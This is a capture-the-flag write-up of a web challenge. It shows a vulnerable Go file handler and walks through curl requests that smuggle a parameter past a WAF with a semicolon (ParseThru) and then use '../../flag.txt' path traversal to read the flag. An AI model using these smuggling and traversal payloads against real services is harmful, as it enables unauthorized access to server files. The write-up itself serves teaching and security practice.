# Go through the hole
* Category: Web
* 400 Points
* Solved by the JCTF Team

## Description

> There is a rabbit hole that has a secret passage that leads to another world.
> 
> Can you find this hidden path?

```go
func accessHandler(w http.ResponseWriter, r *http.Request) {
    file := strings.Join(r.URL.Query()["file"], "")
    filePath := "templates/access.html"
    if file != "" {
        requestedFile := filepath.Clean(file)
        tmpPath := filepath.Join("/app/templates", requestedFile)

            _, err := os.Open(tmpPath)
        if err == nil {
            filePath = tmpPath
        } else {
            log.Print(err)
        }
    }
    var tpl = template.Must(template.ParseFiles(filePath))
    tpl.Execute(w, nil)
}
```


## Solution

Manually searching for the vulnerability in the attached code is so 2021. Let's ask [ChatGPT](https://openai.com/blog/chatgpt/) what it is:

> There is a potential vulnerability in the code because the `filepath.Join()` function is used to construct the file path for the requested file, but this function does not validate the input file to ensure that it does not contain directory traversal sequences such as "`..`". This means that an attacker could potentially supply a file name that includes "`..`" in the query string, allowing them to access files outside of the `/app/templates` directory.

Nice. Let's try it:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Go_through_the_hole]
└─$ curl -i "https://go-through-the-hole.intent.ctf.today/?file=flag.txt"
HTTP/2 401
date: Fri, 16 Dec 2022 13:20:09 GMT
content-type: text/plain; charset=utf-8
content-length: 12
strict-transport-security: max-age=15724800; includeSubDomains

Unauthorized
```

That didn't work. In fact, nothing that had the "file=" parameter worked, and it looked like there's some WAF blocking requests before they arrive to `accessHandler`.

We looked for ways to bypass a WAF related to `Golang` and found [ParseThru](https://www.oxeye.io/blog/golang-parameter-smuggling-attack) - A method for exploiting HTTP parameter smuggling in Golang. The name of the challenge raised the confidence that this is the vulnerability in question.

> GoLang – or Go – uses the ‘net/url’ library to parse URLs and, prior to version 1.17, would consider semicolons in the query part of the URL as a valid delimiter. With version 1.17, however, semicolons are treated as an error, and one of the methods responsible for getting the parsed query string ignores the error returned.
> 
> This means that when a Go-based public API built on version 1.17 or later communicates with an internal service running a prior version, specially crafted requests containing a semicolon in the query string could be smuggled through.
> 
> ([Source](https://portswigger.net/daily-swig/parsethru-http-parameter-smuggling-flaw-uncovered-in-several-go-applications))

So, all we need to do is append a semicolon to the parameter to smuggle it in, right?

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Go_through_the_hole]
└─$ curl -i "https://go-through-the-hole.intent.ctf.today/?file=flag.txt;" -s  | grep h2
      <h2>Find the secret to enter the hole!</h2>
```

Unfortunately, this didn't work - the server ignored the parameter altogether. Some progress was made after trying to query the `/access` endpoint, based on `accessHandler`:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Go_through_the_hole]
└─$ curl -i "https://go-through-the-hole.intent.ctf.today/access?file=flag.txt;" -s  | grep h2
      <h2>Close, but not enough!</h2>
```

At this point, we were able to locate the flag file using the path traversal vulnerability we saw earlier:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Go_through_the_hole]
└─$ curl -i "https://go-through-the-hole.intent.ctf.today/access?file=../../flag.txt;" -s  | grep h2
      <h2>INTENT{g0_P4RseThru_sMugGl3_MTMzNw==}</h2>
```